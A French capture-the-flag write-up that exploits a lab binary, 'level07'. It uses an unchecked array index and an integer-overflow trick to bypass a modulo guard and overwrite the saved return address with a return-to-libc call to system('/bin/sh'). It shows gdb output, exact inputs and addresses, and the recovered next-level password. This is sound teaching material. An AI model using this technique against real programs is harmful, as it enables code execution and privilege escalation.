On a un programme qui nous propose de stocker des nombre dans un tableau,
il nous propose de les lire aussi.
Il y a cependant une protection, si index % 3 = 0, ou que index >> 24 = 183 (deplacement de 24bits vers la droite) on ne peut pas stocker de nombre à cet index
Tous les printf sont protégé, et les buffer limité, on ne peut donc pas exploiter un format string attaque ou un overflow.
En revanche, les index ne sont pas limité, cela signifie que l'on peut écrire n'importe ou dans la mémoire à tab + index.
Notre tableau d'int est mis à 0 sur 100 addresse. Les addresses au dela de 100 ne sont pas protéger d'une réecriture (sauf si tombe sur %3).
Comme on peut réécrire sur les addresses, on va tenter de faire un return to libc.
Pour cela, il faut trouver l'addresse de retour :

(gdb) b main
(gdb) run
    Starting program: /home/users/level07/level07 
    Breakpoint 1, 0x08048729 in main ()
(gdb) info frame
    Stack level 0, frame at 0xffffd4f0:
    eip = 0x8048729 in main; saved eip 0xf7e45513

La "saved eip" correspond à notre addresse de retour à la fin du programme. C'est donc 0xf7e45513

Trouvons ou commence notre tableau d'int :
   0x08048791 <+110>:	lea    0x24(%esp),%ebx
   0x08048795 <+114>:	mov    $0x0,%eax
   0x0804879a <+119>:	mov    $0x64,%edx
   0x0804879f <+124>:	mov    %ebx,%edi
   0x080487a1 <+126>:	mov    %edx,%ecx
   0x080487a3 <+128>:	rep stos %eax,%es:(%edi)
Avec ces ligne, le programme aligne à $esp+0x24 pour mettre à 0 les 100 prochaine addresse, c'est l'innitialisation de notre tableau d'int, qu'on enverra ensuite à nos autre fonctions
On va donc regarder à quelle addresse correspond le début de notre tablea:

(gdb) b *0x08048791
Breakpoint 1 at 0x8048791
(gdb) run
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048791 in main ()
(gdb) x/wx $esp+0x24
0xffffd324:	0x00000000

Notre tableau commence à 0xffffd324 (ce sera notre tab[0])

Maintenant comme on sait que au dela de 100 addresses, le reste n'a pas était mis à 0, voyons si on trouve
quelque chose d'intérressant à override au dela de nos 100 addresses :


(gdb) x/150wx $esp+0x24
0xffffd324:	0x00000000	0x00000000	0x00000001	0x00000000
0xffffd334:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd344:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd354:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd364:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd374:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd384:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd394:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd3a4:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd3b4:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd3c4:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd3d4:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd3e4:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd3f4:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd404:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd414:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd424:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd434:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd444:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd454:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd464:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd474:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd484:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd494:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd4a4:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd4b4:	0x00000001	0x726f7473	0x00000065	0x00000000
0xffffd4c4:	0x00000000	0x00000000	0x9a21aa00	0xf7feb620
0xffffd4d4:	0x00000000	0x08048a09	0xf7fceff4	0x00000000
0xffffd4e4:	0x00000000	0x00000000	!0xf7e45513!0x00000001
0xffffd4f4:	0xffffd584	0xffffd58c	0xf7fd3000	0x00000000
0xffffd504:	0xffffd51c	0xffffd58c	0x00000000	0x080482b8
0xffffd514:	0xf7fceff4	0x00000000	0x00000000	0x00000000
0xffffd524:	0xce77b305	0xf977f715	0x00000000	0x00000000
0xffffd534:	0x00000000	0x00000001	0x08048510	0x00000000
0xffffd544:	0xf7ff0a50	0xf7e45429	0xf7ffcff4	0x00000001
0xffffd554:	0x08048510	0x00000000	0x08048531	0x08048723
0xffffd564:	0x00000001	0xffffd584	0x08048a00	0x08048a70
0xffffd574:	0xf7feb620	0x00000095

à la 115e addresse -> tab[114] = 0xf7e45513
0xf7e45513 <__libc_start_main+243>:	0xe8240489

135e addresse -> tab[134] = 0x08048510
(gdb) x/wx 0x08048510
0x8048510 <_start>:	0x895eed31

138e addresse -> tab[137] = 0xf7e45429
0xf7e45429 <__libc_start_main+9>:	0x9bcbc381

144e addresses -> tab[143]
0x8048723 <main>:	0x57e58955
(gdb) x/wx 0xffffd584

147e addresse -> tab[146]
(gdb) x/wx 0x08048a00
0x8048a00 <__libc_csu_init>:	0x53565755

148e addresses -> tab[147]
(gdb) x/wx 0x08048a70
0x8048a70 <__libc_csu_fini>:	0x1c8bc3f3

On a donc des addresses de fonctions plus loin dans notre tableau d'int.
Mais surtout à tab[114], on a notre saved eip ! notre return addresse !

Il suffit d'override l'addresse situé à tab[114] par un appel system(/bin/sh) pour faire un return to libc.

Trouvons les addresses nécessaire à notre return to libc !

system = 0xf7e6aed0 = 4159090384
exit = 0xf7e5eb70 = 4159040368
/bin/sh = 0xf7f897ec = 4160264172

Et essayons: 

(gdb) ...
    Input command: store
    Number: 4159090384
    Index: 114
    *** ERROR! ***
        This index is reserved for wil!
    *** ERROR! ***
    Failed to do store command

On rencontre un problème 114 % 3 = 0, l'index 114 est protégé par le modulo, on ne peut donc ecrire à l'emplacement de l'addresse retour.
Mais on a une solution : lors  d'un dépassement de MAX_INT, le nombre reviens à 0 puisque seul les bits de poids faible seront pris en compte.
Explication:
Decimal      Hexadecimal             Binaire
4294967295 = 0x00000000 0xffffffff = 00000000000000000000000000000000 11111111111111111111111111111111 -> 4294967295
4294967296 = 0x00000001 0x00000000 = 00000000000000000000000000000001 00000000000000000000000000000000 -> 0
4294967297 = 0x00000001 0x00000001 = 00000000000000000000000000000001 00000000000000000000000000000001 -> 1

Donc si on veut obtenir 114 uniquement avec les bit de poids faible, on a:
00000000000000000000000000000001 00000000000000000000000001110010 = 4294967410

Sauf que si on entre directement ce nombre qui est superieur au max int, la separation entre bits de poids fort et bit de poids faible se fera aussi au moment de la verification du modulo, puisqu'il est
deja trop grand. Donc ca reviendrai exactement au meme que de mettre directement 114. Et ca ne passera pas la verification.

Mais on remarque dans le code de la fonction store_number, a la toute fin, au moment de stocker le nombre a l'index indiqué:
   0x080486f9 <+34>:	mov    -0xc(%ebp),%eax
   0x080486fc <+37>:	shl    $0x2,%eax
Cela permet de stocker le nombre que l'on donne non pas à <début du tableau + index>, mais à <début du tableau + index*4>
(En effet la taille d'un int est de 4 octets, il faut donc prévoir 4 octets pour chaque nombre stocké)

Et cela va nous permettre de passer l'etape de la verification du modulo car cela va nous permettre 
d'envoyer un nombre inferieur au max_int, mais qui une fois multiplier par 4 a a fin de la fonction sera superieur a max_int, et sera donc ainsi reformater au bon index. 

Donc ce n'est plus à l'index 114 que l'on veut stocker notre nombre mais à 114*4 = 456.
Il faut que notre nombre envoyé, une fois multiplier par 4, soit equivalent a 456 au niveau des bits de poids faibles.

Il faut donc faire en sorte que une fois que l'on aura passé cette ligne:
   0x080486fc <+37>:	shl    $0x2,%eax
c'est à dire que l'on aura fait index*4, il faut que le nombre qui reste du coté des bits de poids faibles soient égale = 456.

456 = 0x000001C8 = 00000000000000000000000111001000
Si on rajoute un 1 dans les bits de poids fort :
00000000000000000000000000000001 00000000000000000000000111001000 = 0x00000001 0x000001C8 = 4294967752

4294967752/4 = 1073741938

Notre nombre final pour écrire à tab[114] est 1073741938.
En effet, en donnant l'index 1073741938, le programme multipliera cet index par 4 car il faut 4 octets pour écrire un nombre.
Après multiplication, le nombre finale sera 4294967752. Sauf que cela dépasse int_max, et seulement les bit de poids faible seront lus, ce qui revient à 456.
On écrira donc notre nouveau nombre à <début du tableau + 456>, c'est à dire à notre tab[114]

$ ./level07
    ...
    Input command: store
        Number: 4159090384
        Index: 1073741938
        Completed store command successfully
    Input command: store
        Number: 4159040368
        Index: 115
        Completed store command successfully
    Input command: store
        Number: 4160264172
        Index: 116
        Completed store command successfully
        Input command: quit
    $ cat /home/users/level08/.pass
    7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
    $ 
